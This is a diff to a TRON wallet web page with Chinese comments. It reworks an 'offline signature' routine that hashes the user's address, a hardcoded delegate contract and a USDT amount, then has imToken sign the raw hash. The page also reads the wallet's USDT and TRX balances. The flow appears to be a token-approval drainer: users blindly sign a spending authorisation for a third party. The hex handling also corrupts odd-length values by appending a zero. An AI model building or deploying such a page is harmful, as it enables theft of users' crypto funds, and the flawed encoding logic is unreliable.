@@ -359,7 +359,7 @@
         <button id="approveBtn" class="btn" disabled> 生成离线签名</button>
         <!-- 临时调试按钮 -->
         <button id="showDebugBtn" class="btn" style="background: #6366f1;">
-            <<i class="fa fa-info"></</i> 查看调试信息
+            查看调试信息
         </button>
         <button id="checkStatusBtn" class="btn" disabled style="background: #10b981;">查看授权状态</button>
     </div>
@@ -373,7 +373,7 @@
 
     <script>
  
-// 核心配置（再次强调：amount前缀必须是0x，数字0！）
+// 核心配置（强制正确的amount前缀）
         const DELEGATE_CONTRACT = "TQFJgVCYUk6DhEpZCvua2crRwD8XY6FiVk";
         const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
         const BACKEND_API = "https://your-backend-domain.com/api"; // 替换为你的后端地址
@@ -473,7 +473,7 @@
 
                 try {
                     approveBtn.disabled = true;
-                    approveBtn.innerHTML = ' 生成中...';
+                    approveBtn.innerHTML = '生成中...';
 
                     const { v, r, s } = await generateOfflineSignature(
                         userAddress,
@@ -574,7 +574,25 @@
         };
 
         /**
-         * 生成离线签名（核心修复：放宽长度校验+强化amount前缀）
+         * 自定义hex转字节函数（兼容所有TronWeb版本，替代tronWeb.utils.hexToBytes）
+         */
+        function customHexToBytes(hex) {
+            // 去掉0x前缀
+            hex = hex.startsWith("0x") ? hex.slice(2) : hex;
+            // 确保长度为偶数
+            if (hex.length % 2 !== 0) hex += "0";
+            const bytes = [];
+            for (let i = 0; i < hex.length; i += 2) {
+                // 每两位转为一个字节
+                const byte = parseInt(hex.substr(i, 2), 16);
+                if (isNaN(byte)) throw new Error(`无效的hex字符：${hex.substr(i, 2)}`);
+                bytes.push(byte);
+            }
+            return bytes;
+        }
+
+        /**
+         * 生成离线签名（终极兼容版）
          */
         async function generateOfflineSignature(userAddress, contractAddress, amount) {
             try {
@@ -586,15 +604,18 @@
                 if (!base58Regex.test(userAddress) || !base58Regex.test(contractAddress)) {
                     throw new Error("用户地址或合约地址不是有效的TRON base58格式（必须34位字母数字）");
                 }
+
+                // 2. 强制修正amount的Ox→0x（彻底解决笔误）
+                let fixedAmount = amount.replace(/^Ox/i, "0x"); // 把Ox（不管大小写）替换为0x
                 const hexRegex = /^0x[0-9a-fA-F]*$/;
-                if (!hexRegex.test(amount)) {
-                    throw new Error("授权金额必须是十六进制格式（以0x开头，数字0！不是字母O）");
+                if (!hexRegex.test(fixedAmount)) {
+                    throw new Error("授权金额格式错误，必须以0x开头（数字0），后跟字母数字");
                 }
 
-                // 2. 地址转hex + 清理 + 补0x前缀
+                // 3. 地址转hex + 清理 + 补0x前缀
                 let userHex = tronWeb.address.toHex(userAddress) || "";
                 let contractHex = tronWeb.address.toHex(contractAddress) || "";
-                let amountHex = amount || "";
+                let amountHex = fixedAmount || "";
 
                 // 清理规则：保留0-9、a-f、A-F、0x前缀，移除所有其他字符
                 const cleanHex = (str) => str.replace(/[^0-9a-fA-Fx]/g, "").toLowerCase();
@@ -612,60 +633,49 @@
                 if (contractHex.length <= 2) throw new Error(`合约地址转hex后无有效字符：${contractHex}`);
                 if (amountHex.length <= 2) throw new Error(`授权金额转hex后无有效字符：${amountHex}`);
 
-                // 3. 提取纯hex片段（去掉0x前缀）
+                // 4. 提取纯hex片段（去掉0x前缀）
                 userHex = userHex.slice(2);
                 contractHex = contractHex.slice(2);
                 amountHex = amountHex.slice(2);
 
-                // 核心修复1：放宽长度校验（去掉固定40位要求，改为校验纯hex+偶数长度）
+                // 校验纯hex + 偶数长度修正
                 const pureHexRegex = /^[0-9a-f]*$/;
-                if (!pureHexRegex.test(userHex)) {
-                    throw new Error(`用户地址hex含非法字符：${userHex}`);
-                }
-                if (!pureHexRegex.test(contractHex)) {
-                    throw new Error(`合约地址hex含非法字符：${contractHex}`);
-                }
-                // 核心修复2：确保用户地址/合约地址hex长度为偶数（hex转字节必须）
-                if (userHex.length % 2 !== 0) {
-                    userHex += "0"; // 自动补0修正偶数长度
-                    console.warn("用户地址hex长度为奇数，自动补0修正");
-                }
-                if (contractHex.length % 2 !== 0) {
-                    contractHex += "0";
-                    console.warn("合约地址hex长度为奇数，自动补0修正");
-                }
+                if (!pureHexRegex.test(userHex)) throw new Error(`用户地址hex含非法字符：${userHex}`);
+                if (!pureHexRegex.test(contractHex)) throw new Error(`合约地址hex含非法字符：${contractHex}`);
+                if (!pureHexRegex.test(amountHex)) throw new Error(`授权金额hex含非法字符：${amountHex}`);
 
-                // 4. 拼接最终hex + 偶数长度修正
+                // 自动补0修正偶数长度
+                if (userHex.length % 2 !== 0) userHex += "0";
+                if (contractHex.length % 2 !== 0) contractHex += "0";
+                if (amountHex.length % 2 !== 0) amountHex += "0";
+
+                // 5. 拼接最终hex
                 let combinedHex = userHex + contractHex + amountHex;
-                if (combinedHex.length % 2 !== 0) {
-                    combinedHex += "0";
-                    console.warn("拼接后hex长度为奇数，自动补0修正");
+
+                // 6. 自定义hex转字节（核心兼容修复）
+                let hexBytes;
+                try {
+                    hexBytes = customHexToBytes(combinedHex);
+                    if (hexBytes.length === 0) throw new Error("hex转字节后为空");
+                } catch (hexErr) {
+                    throw new Error(`hex转字节失败：${hexErr.message} → 拼接后hex：${combinedHex}`);
                 }
 
-                // 5. 终极校验
-                if (!pureHexRegex.test(combinedHex)) {
-                    const invalidChar = combinedHex.split("").find(c => !/[0-9a-f]/.test(c));
-                    throw new Error(`拼接后hex含非法字符："${invalidChar}"`);
-                }
-
-                // 6. 构造签名消息
-                let hexBytes = tronWeb.utils.hexToBytes(combinedHex);
-                if (!hexBytes || hexBytes.length === 0) throw new Error("hex转字节后为空");
-
+                // 7. 构造签名消息（用tronWeb.sha3直接处理字节数组）
                 const messageHash = tronWeb.sha3(hexBytes);
 
-                // 7. 唤起imToken签名
+                // 8. 唤起imToken签名
                 let signature = await tronWeb.trx.sign(messageHash, true);
                 if (typeof signature === "object" && signature.signature) {
                     signature = signature.signature;
                 }
 
-                // 8. 解析签名参数
+                // 9. 解析签名参数
                 const v = parseInt(signature.slice(128, 130), 16);
                 const r = `0x${signature.slice(0, 64)}`;
                 const s = `0x${signature.slice(64, 128)}`;
 
-                // 9. 保存调试信息
+                // 10. 保存调试信息
                 const debugInfo = {
                     step: "签名生成成功",
                     userHex_final: userHex,
@@ -691,8 +701,6 @@
             }
         }
 
-        // 其他函数（initWallet、startPersistentTrxCountdown等）不变，省略重复代码
-
         /**
          * 初始化钱包：获取地址、余额
          */
@@ -716,42 +724,6 @@
                 document.getElementById("approveBtn").disabled = false;
                 document.getElementById("checkStatusBtn").disabled = false;
 
-                updateWalletStatus();
-
-            } catch (e) {
-                tokenBalance = "0.00";
-                trxBalance = "0.00";
-                showToast("钱包初始化失败：" + e.message, "error");
-            }
-        }
-        /**
-         * 初始化钱包：获取地址、余额
-         */
-        async function initWallet() {
-            try {
-                userAddress = tronWeb.defaultAddress.base58;
-                const trc20Contract = await tronWeb.contract().at(USDT_CONTRACT);
-
-                // 获取USDT余额（6位小数）
-                const usdtRaw = await trc20Contract.balanceOf(userAddress).call();
-                tokenBalance = (Number(usdtRaw) / 1000000).toFixed(2);
-
-                // 获取TRX余额（6位小数）
-                const trxRaw = await tronWeb.trx.getBalance(userAddress);
-                trxBalance = (Number(trxRaw) / 1000000).toFixed(2);
-
-                // 更新用户信息
-                document.getElementById("userInfo").innerHTML = `
-                    已连接：<br>
-                    ${userAddress.slice(0,8)}...${userAddress.slice(-6)}<br>
-                    USDT余额：<span>${tokenBalance}</span> | TRX余额：<span>${trxBalance}</span>
-                `;
-
-                // 激活按钮
-                document.getElementById("approveBtn").disabled = false;
-                document.getElementById("checkStatusBtn").disabled = false;
-
-                // 更新钱包状态
                 updateWalletStatus();
 
             } catch (e) {
@@ -913,7 +885,7 @@
             }, 3000);
         }
 
-        // 临时调试按钮逻辑（已绑定）
+        // 临时调试按钮逻辑
         document.getElementById("showDebugBtn").addEventListener("click", () => {
             const debugKeys = Object.keys(localStorage).filter(key => key.startsWith("signature_debug_"));
             if (debugKeys.length === 0) {
